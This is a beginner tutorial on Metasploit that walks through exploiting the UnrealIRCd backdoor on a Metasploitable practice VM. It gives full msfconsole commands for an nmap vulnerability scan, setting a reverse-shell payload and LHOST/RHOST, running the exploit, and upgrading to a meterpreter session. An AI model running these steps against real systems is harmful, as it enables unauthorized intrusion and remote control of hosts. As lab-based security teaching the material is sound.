---
title: Metasploit framework
description: What is metasploit, what do we use it for and how can we use it. 
layout: ../../layouts/MainLayout.astro
---

## Setup before continuing

Go to [metasploitable vm setup](page-metasploitable)

## What is metasploit framework

The Metasploit Initiative is a computer security project that offers information on security vulnerabilities and assists in penetration testing and the building of IDS signatures. Rapid7, a security firm located in Boston, Massachusetts, owns it. 

The metasploit framework is a framework of tools which we can use to gain access on different networks and computer systems, one of the tools called msfconsole.

## What is metasploit framework used for

The Metasploit framework is a sophisticated tool that can be used by both cybercriminals and ethical hackers to investigate systemic vulnerabilities in networks and servers. It can be readily altered and used with most operating systems because it is an open-source framework. In this case we will be using it for ethical hacking and we are not responsible for what you use it for on your own.

## What's msfconsole?:
"msfconsole" is the primary interface to Metasploit Framework. You can use it to scan and exploit networks, servers, pcs etc. 
It provides an "all-in-one" centralized console and allows you efficient access to virtually all of the options available in the Metasploit
Framework.

The below example of how to use msfconsole is an example of exploiting the metasploitable VM which you can download at: [Download metasploitable 2017](https://information.rapid7.com/download-metasploitable-2017-thanks.html)

The exploit used here is targeted at port 6667 (irc). You can additionally scan with nmap for more ports and vulnerabilities.

Example to scan for more ports and vulnrabilities:
   
    sudo nmap -sV -sT --script=vuln ip_of_vm 

## how to install metasploit framework

The software should already be installed on the [Virtual Machine](page-3) that we setup previus

If the software is not installed on your machine I expect you to be able to install it yourself

## how to run msfconsole
To run the msfconsole tool you start by opening the terminal 
After opening the terminal you write the following in terminal
    msfconsole

Result of command: 
```markdown
msf6 >
```

A random metasploit tip + a random tool banner at the top

## What and how + examples:

You can use the "use" command to select exploits, scanners etc
example:

    msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor"

This is exploiting the "irc" service if it's running (port 6667). When the user have selected the exploit, you have to choose a payload.
Using the "set" command you can "set PAYLOAD"

example: 
    
    msf6 > set PAYLOAD cmd/unix/reverse

This will set the payload cmd/unix/reverse. A backdoor into the server getting cli access to cmd.
    
After we have told it which exploit and payload to use, we have to specify some other things.
With the command "show options" we can see what things we have to specify.

exmple:
```markdown
   msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options 
   Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   6667             yes       The target port (TCP)

  Payload options (cmd/unix/reverse):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

  Exploit target:
   Id  Name
   --  ----
   0   Automatic Target
```

This might seem scary at first becuase you don't know what all the variables mean and what you have to do with them

It says the Name of the things that has to be filled out like, LHOST, RHOST. This is your localhost which you can get by typing "ifconfig" and then       
looking at the inet. fx could look like: inet 192.168.0.x (x is your last numbers of your local network)


Then there is RHOST, which is the remote host. This is the ip address of the website, server or target machine that we are exploiting.

so just like we do "set PAYLOAD" we do the same for LHOST and RHOST

example:

    msf6 > exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST xx.xx.xx.xx (xx.xx.xx.xx is the target ip that you put in there)

Setting the LHOST (localhost / local network ip)

    msf6 > exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.0.xx 
    
Now it should look something like:

```markdown
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  Target ip address here             yes       The target host(s)
   RPORT   6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  Your local host here     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Notice that the LHOST and RHOST has changed

After we have set LHOST and RHOST for this exploit, we can do the next step which is starting the exploit by just typing "exploit" into the command line.
example:

    msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit 


## Upgrading a metasploit session ( more advanced than beginner)

Upgrading any session.


In the example above we exploit and hack into the server with an irc backdoor exploit. This is great, but if we want some more options and commands to play with we can upgrade the session by pressing ctrl + z (If you are in the current shell session with the first exploit) and it will return you to the msfconsole command line. now you can type "sessions" to see active session, after that look at the session number. Type in session -u session_num to then upgrade it and get a meterpreter session. Activate the session by typing "session session_id" and then it get you into a new cli. Here type "help" to see the extra commands you now can use.